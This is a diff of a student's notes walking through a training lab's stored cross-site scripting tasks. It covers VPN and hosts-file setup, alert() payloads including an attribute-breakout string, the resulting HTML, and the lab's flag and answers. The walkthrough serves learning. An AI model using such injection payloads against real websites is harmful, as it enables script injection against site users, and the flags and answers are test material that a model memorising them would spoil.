@@ -297,7 +297,7 @@ the `-L` forwards `local_port`:`destination_host`:`destination_port`
 - ip: `10.42.251.155`
 
 
-## 2.1 Start VPN
+### 2.1 Start VPN
 
 - visit `https://intranet-dlh.hbtn.io/user_sandboxes#`
 - \ Create VPN Configuration
@@ -306,6 +306,9 @@ the `-L` forwards `local_port`:`destination_host`:`destination_port`
 - wait a few seconds, reload page
 - \ Europe (Paris) Download configuration
 - download file `attila_nemet_cyber_dlh_lu.ovpn` (in my case)
+- nice observation: **it lasts for 3 months :-)**
+  - Created: 2026-07-14
+  - Expires: 2026-10-14
 - execute:
 ```bash
 sudo openvpn attila_nemet_cyber_dlh_lu.ovpn
@@ -313,7 +316,7 @@ sudo openvpn attila_nemet_cyber_dlh_lu.ovpn
 - the prompt is not returned, that is ok
 
 
-## 2.2 Set `web0x01.hbtn` to point to ip of `cyber_websec_0x01`
+### 2.2 Set `web0x01.hbtn` to point to ip of `cyber_websec_0x01`
 
 On local PC edit `/etc/hosts`:
 
@@ -333,7 +336,7 @@ ff02::2         ip6-allrouters
 10.42.251.155 web0x01.hbtn
 ```
 
-## 2.3 Continue with the link from last exercise
+### 2.3 Continue with the link from last exercise
 
 When we visited the [http://web0x01.hbtn:8080/a2/crypto_encoding_failure/](http://web0x01.hbtn:8080/a2/crypto_encoding_failure/) link we saw the left sidebar has an item **A3 - Injection** and clicking on this we have our next candidate: [Cross Site Scripting - Stored](http://web0x01.hbtn/a3/xss_stored/profile)
 - goto: [http://web0x01.hbtn/a3/xss_stored/profile](http://web0x01.hbtn/a3/xss_stored/profile)
@@ -377,7 +380,7 @@ When we visited the [http://web0x01.hbtn:8080/a2/crypto_encoding_failure/](http:
   a28af3d118142ab65b02599477bd698c
   ```
 
-## 2.4 Report the Flag
+### 2.4 Report the Flag
 
 ```bash
 echo a28af3d118142ab65b02599477bd698c > 3-flag.txt
@@ -386,3 +389,69 @@ cat 3-flag.txt
 ```
 
 - commit and run correction
+
+
+
+## Task 3. (A3:2021) - Injection [Stored XSS] - part 2/3
+
+### Discovering a Vulnerable Input Field
+
+Identify which input field in the profile edit page is vulnerable to Cross-Site Scripting (XSS).
+
+**Instructions**:
+
+1. Explore Edit Profile Page:
+   - Navigate to your profile's edit page: http://[MACHINE-IP]/a3/xss_stored/edit.
+   - This page contains multiple input fields where you can enter or update your personal information.
+2. Test for XSS Vulnerability:
+   - Test each input field for XSS vulnerability by entering a simple script such as <script>alert('XSS')</script> into the field and saving your changes.
+   - Observe which input field, when modified, triggers the JavaScript alert upon viewing your profile. This indicates an XSS vulnerability.
+3. Submit the vuln case name:
+   - Observe the source code behavior. `Quotes..`
+   - Find out the vuln field name.
+
+    ```bash
+    $ echo "name" > 4-vuln.txt
+    ```
+
+
+### Solution
+
+- visit http://web0x01.hbtn/a3/xss_stored/edit
+- put `<script>alert('XSS')</script>` in First Name (in my case?), update, got
+  ```
+  Congratulations!
+  FLAG_1/2:
+  a28af3d118142ab65b02599477bd698c
+  ```
+- checking the html of the profile page we see a `div` tag:
+  ```html
+  </div><div id="main"  f_name="&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;" l_name="x" email="yosri@web0x01.hbtn" role="x" tz="1" bio="" ></div>
+  ```
+- now this is somewhat ugly, it is nicer if we check this `div` tag before we changed yosri's name:
+  ```html
+  <div id="main"  f_name="Yosri" l_name="G" email="yosri@web0x01.hbtn" role="Cyber Security Expert" tz="1" bio="Hello, Follow me through our journey towards Cyber Security Expertise." ></div>
+  ```
+- now if we insert our javascript alert `<script>alert('XSS')</script>` in `f_name` we're getting:
+  ```html
+  <div id="main" f_name="<script>alert('XSS')</script>" l_name="G" ... ></div>
+  ```
+- we got only flag 1/2 because we manipulated the correct field, but our script won't be executed since it is between quotation marks, so the browser it considers as text and it displays
+- to trigger the execution of our script there was a suggestion: `Quotes..`
+- if we're injecting
+  ```html
+  "><script>alert('XSS')</script>
+  ```
+  this will be our new html code:
+  ```html
+  <div id="main" f_name=""><script>alert('XSS')</script>" l_name="G" ... ></div>
+  ```
+- By starting with `>"`, we are explicitly closing the `f_name` attribute and the `<div id="main">` tag. After that, our `<script>` tag is "eliberated" and it will be executed!
+- in my case it got frozen, but let's try anyway sending `f_name` as flag
+
+  ```bash
+  echo f_name > 4-vuln.txt
+  
+  cat 4-vuln.txt
+  ```
+- commit 
